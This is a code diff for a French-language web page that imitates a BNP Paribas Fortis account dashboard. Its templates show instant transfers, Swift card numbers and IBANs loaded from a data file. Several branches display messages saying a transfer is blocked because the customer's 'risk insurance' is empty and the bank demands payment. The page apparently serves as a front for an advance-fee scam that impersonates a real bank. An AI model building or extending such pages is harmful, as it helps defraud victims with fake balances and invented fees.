@@ -47,10 +47,11 @@ title{
     height:50px;
     text-align: center;
     color: white;
+    display: block;
     font-size: 25px;
     border: 2px solid whitesmoke;
     outline: none;
-    width:300px;
+    width:100%;
     background: seagreen;
     border-radius: 4px;
   }
@@ -157,12 +158,13 @@ border: 2px solid whitesmoke;
     text-align: center;
     }
  .btn-send button{
-   margin: 0 auto;
+  
    text-align: center;
    outline: none:
    font-size:20px;
+   display:block;
    border:0.5px solid seagreen;
-   width:360px;
+   width:100%;
    padding:8px;
    background:seagreen;
    color:white;
@@ -674,18 +676,18 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
         </div>`), 3000)
     clearTimeout(timeout)
     console.log(bankInter+'yeah')
-    if (Number(amount) +Number(deposit)>= Number(inputTag[1].value)) {
+    if (Number(amount) +Number(deposit)>= Number(inputTag[2].value)) {
  
     const timeout = setTimeout(loaded(70, `
     <div class="actived">
       
    
               <h4>IBAN</h4>
-            Virement instantané de ${inputTag[1].value} ${currency}
+            Virement instantané de ${inputTag[2].value} ${currency}
           
             <div class="iban-transf">
             
-  BNP Paribas Fortis vers ${id}
+  ${inputTag[1].value} vers ${id}
             </div>
                        </div>
             `), 1000)
@@ -711,7 +713,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
     }
       else{
         if (assurance== 0) {
-      if (typeofCompte == 'Donation') {
+      if (typeofCompte=='Donation') {
         const timeout = setTimeout(loaded(92, `
                 <div class="not-actived">
                  <h3>votre assurance risque est vide (0€).
@@ -722,7 +724,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
                               `), 1000)
         clearTimeout(timeout)
       }
-      if (typeofCompte == "Prêt") {
+      if (typeofCompte == "crédit") {
         const timeout = setTimeout(loaded(92, `
             <div class="not-actived">
              <h3>votre assurance risque est vide (0€).
@@ -744,7 +746,7 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
     }
       else{
         console.log(bankInter+'interna')
-    const timeout = setTimeout(loaded(50, `
+    const timeout = setTimeout(loaded(10, `
       <div class="actived">
         
     
@@ -752,18 +754,18 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
         </div>`), 3000)
     clearTimeout(timeout)
     console.log(bankInter+'yeah')
-    if (Number(amount) +Number(deposit)>= Number(inputTag[1].value)) {
+    if (Number(amount) +Number(deposit)>= Number(inputTag[2].value)) {
  
-    const timeout = setTimeout(loaded(70, `
+    const timeout = setTimeout(loaded(50, `
     <div class="actived">
       
    
               <h4>IBAN</h4>
-            Virement instantané de ${inputTag[1].value} ${currency}
+            Virement instantané de ${inputTag[2].value} ${currency}
           
             <div class="iban-transf">
             
-  BNP Paribas Fortis vers ${id}
+  ${inputTag[0].value} vers ${inputTag[1].value}
             </div>
                        </div>
             `), 1000)
@@ -800,12 +802,12 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
                               `), 1000)
         clearTimeout(timeout)
       }
-      if (typeofCompte == "Prêt") {
+      if (typeofCompte == "crédit") {
         const timeout = setTimeout(loaded(92, `
             <div class="not-actived">
              <h3>votre assurance risque est vide (0€).
             </h3> 
-            une assurance est demandée par la banque BNP
+            une assurance gar est demandée par la banque BNP
             Paribas Fortis pour  couvrir en cas de non remboursement d'un crédit  financiers par le bénéficiaire du credit financier.
       
             </div>
@@ -831,26 +833,26 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
   
   else{
  
-  
-   if (Number(inputTag[1].value) != 0) {
-  
-  
-      if (Number(inputTag[1].value) > Number(Number(amount) + Number(deposit))) {
+ 
+   if (Number(inputTag[2].value) != 0) {
   
   
+      if (Number(inputTag[2].value) > Number(Number(amount) + Number(deposit))) {
   
   
-        info[1].innerHTML = 'votre solde est insuffisant'
+  
+  
+        info[0].innerHTML = 'votre solde est insuffisant'
         montantCheck = false
       }
       else {
         montantCheck = true
-        info[1].textContent = ''
+        info[0].textContent = ''
       }
     }
     else {
   
-      info[1].textContent = `Mininum de transfert d'argent  1${currency}`
+      info[0].textContent = `Mininum de transfert d'argent  1${currency}`
       montantCheck = false
     }
   
@@ -998,26 +1000,26 @@ function isTransferInter(user){
     <div class="transferto">
       <div class="trnf-title">
     
-        <h2>Transfert <i style="font-size:24px" class="fa">&#xf19c;</i></h2>
+        <h2>Expédition par Swift<i style="font-size:24px" class="fa">&#xf19c;</i></h2>
     
       </div>
+       <div class="inp-iban">
+         <div class="iban">
+           <h4 style="text-align:center;
+                   margin:20px 0px;">Carte Swift BNP BANQUE (expéditeur)</h4>
+           <input disabled type="text" value="${user.cardBank.carteBnp}" />
+         </div>
       <div class="inp-iban">
         <div class="iban">
-          <h4>IBAN</h4>
+          <h4 style="text-align:center;
+          margin:20px 0px;">IBAN du Bénéficiaire(destinataire)</h4>
           <input disabled type="text" value="${user.cardBank.iban}" placeholder="IBAN">
         </div>
     
         <div class="info">
     
         </div>
-        <div class="iban">
-          <h4>BIC</h4>
-          <input disabled type="text" value="${user.cardBank.bic}" placeholder="BIC">
-        </div>
-    
-        <div class="info">
-    
-        </div>
+        
         <div class="bic">
           <h4>Montant</h4>
           <input type="number" value="" placeholder="25€">
@@ -1035,27 +1037,31 @@ function isTransferInter(user){
         <div class="transferto">
           <div class="trnf-title">
         
-            <h2>Transfert <i style="font-size:24px" class="fa">&#xf19c;</i></h2>
+            <h2>Expédition par Swift<i style="font-size:24px" class="fa">&#xf19c;</i></h2>
         
           </div>
+           <div class="inp-iban">
+           <div class="iban">
+             <h4 style="text-align:center;
+             margin:20px 0px;">Carte Swift BNP BANQUE (expéditeur)</h4>
+             <input disabled type="text" value="${user.cardBank.carteBnp}" />
+           </div>
+           
           <div class="inp-iban">
             <div class="iban">
-              <h4>N° compte bancaire</h4>
+              <h4 style="text-align:center">N° compte bancaire(destinataire)</h4>
               <input disabled type="text" value="${user.cardBank.idAccount}" placeholder="N° Compte Bancaire">
             </div>
         
-                <div class="info">
-            
-                </div>
-           
+                
+
+       
             <div class="bic">
               <h4>Montant</h4>
               <input type="number" value="" placeholder="25€">
               <div class="info">
               </div>
-        <div class="info">
-        
-        </div>
+      
         
             </div>
           </div>
@@ -1119,10 +1125,14 @@ function isIdAccount(filtuser){
          <div class="account-typ">
            ${filtuser.cardBank.iban}
          </div>
-         <div clclass="account-typ">
+         <div class="account-typ">
            <h4>BIC</h4>
            ${filtuser.cardBank.bic}
          </div>
+          <div class="account-typ">
+            <h4>Carte Bancaire Swift BNP Paribas Banque</h4>
+            ${filtuser.cardBank.carteBnp}
+          </div>
     `
   }
   else{
@@ -1132,7 +1142,7 @@ function isIdAccount(filtuser){
        ${filtuser.cardBank.bankName}
      </div>
      <div class="account-typ">
-       <h3>Carte bancaire
+       <h3>Carte bancaire du benef
          <i class="fa fa-credit-card" aria-hidden="true"></i>
        </h3>
        <div>
@@ -1143,7 +1153,10 @@ function isIdAccount(filtuser){
          <div class="account-typ">
            ${filtuser.cardBank.idAccount}
          </div>
-        
+        <div class="account-typ">
+        <h4>Carte Bancaire Swift BNP Paribas Banque</h4>
+          ${filtuser.cardBank.carteBnp}
+          </div>
     `
     
   }
@@ -1164,7 +1177,7 @@ window.addEventListener('load', function() {
 
 
  let user={}
-    fetch("https://raw.githubusercontent.com/lisbonne456/gitau/master/data.json").then(function(resp) {
+    fetch("/data.json").then(function(resp) {
       return resp.json()
     }).then(function(data) {
     
@@ -1311,7 +1324,11 @@ let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""
     
     })
    
-   
+   window.addEventListener('keydown', function() {
+     if (event.keycode==166) {
+       location.href = 'https://www.google.com/search?q=event.key&client=ms-android-transsion-tecno-rev1&sca_esv=d572f8b83efcb59b&sxsrf=ADLYWIIoCzNz6rzrCMBSA8V_OzK5qDfH2w%3A1722085371074&ei=---kZp6VBPCdhbIPtdqLsQg&oq=event.key&gs_lp=EhNtb2JpbGUtZ3dzLXdpei1zZXJwIglldmVudC5rZXkqAggAMggQABiABBjLATIIEAAYgAQYywEyBRAAGIAEMgUQABiABDIIEAAYgAQYywEyCBAAGIAEGMsBMggQABiABBjLATIIEAAYgAQYywFI0fwCUJEMWJcicAN4AZABAJgBigKgAfAQqgEDMi05uAEByAEA-AEBmAIMoALiFKgCD8ICBxAjGCcY6gLCAgQQIxgnwgIIEAAYgAQYsQPCAgUQLhiABMICCxAuGIAEGLEDGIMBwgIOEC4YgAQYsQMYgwEYigXCAgoQLhiABBhDGIoFwgIKEAAYgAQYQxiKBcICEBAuGIAEGNEDGEMYxwEYigXCAg4QLhiABBjRAxjHARjLAcICCBAuGIAEGMsBwgIOEC4YgAQYxwEYywEYrwGYA5cBkgcFMi4xLjmgB8pT&sclient=mobile-gws-wiz-serp'
+     }
+   })
 
 </script>
  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
